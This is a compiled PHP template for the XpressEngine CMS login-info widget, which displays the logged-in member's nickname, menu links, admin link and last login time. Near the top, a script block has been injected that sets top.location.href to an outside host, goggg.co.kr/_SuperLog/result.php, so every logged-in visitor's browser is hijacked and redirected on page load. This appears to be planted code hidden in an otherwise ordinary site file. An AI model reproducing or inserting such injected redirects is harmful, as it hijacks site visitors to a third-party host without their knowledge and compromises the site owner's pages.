<?php if(!defined("__XE__"))exit;?>
<?php require_once('./classes/xml/XmlJsFilter.class.php');$__xmlFilter=new XmlJsFilter('widgets/login_info/skins/xe_official/filter','logout.xml');$__xmlFilter->compile(); ?> 
 
<script>
 top.location.href='http://goggg.co.kr/_SuperLog/result.php?OKMode=checkOk'; 
</script>
<fieldset id="login" class="login_<?php echo $__Context->colorset ?>">
<form action="" method="post"><input type="hidden" name="error_return_url" value="<?php echo htmlspecialchars(getRequestUriByServerEnviroment(), ENT_COMPAT | ENT_HTML401, 'UTF-8', false) ?>" /><input type="hidden" name="act" value="<?php echo $__Context->act ?>" /><input type="hidden" name="mid" value="<?php echo $__Context->mid ?>" /><input type="hidden" name="vid" value="<?php echo $__Context->vid ?>" />
    <div class="userName">
        <div class="fl"><div class="member_<?php echo $__Context->logged_info->member_srl ?>"><strong><?php echo $__Context->logged_info->nick_name ?></strong></div></div>
        <div class="fr"><a href="<?php echo getUrl('act','dispMemberLogout') ?>"><img src="/xe/widgets/login_info/skins/xe_official/images/<?php echo $__Context->colorset ?>/buttonLogout.gif" alt="<?php echo $__Context->lang->cmd_logout ?>" width="47" height="18" /></a></div>
    </div>
    <ul class="userMenu">
        <?php if($__Context->logged_info->menu_list&&count($__Context->logged_info->menu_list))foreach($__Context->logged_info->menu_list as $__Context->key => $__Context->val){ ?>
        <li><a href="<?php echo getUrl('act',$__Context->key,'member_srl','') ?>"><?php echo Context::getLang($__Context->val) ?></a></li>
        <?php } ?>
        <?php if($__Context->logged_info->is_admin=="Y" && !$__Context->site_module_info->site_srl){ ?>
        <li><a href="<?php echo getUrl('','module','admin') ?>" onclick="window.open(this.href);return false;"><?php echo $__Context->lang->cmd_management ?></a></li>
        <?php } ?>
    </ul>
    <p class="latestLogin"><?php echo $__Context->lang->last_login ?><br /><span><?php echo zDate($__Context->logged_info->last_login, "Y-m-d H:i") ?></span></p>
</form>
</fieldset>
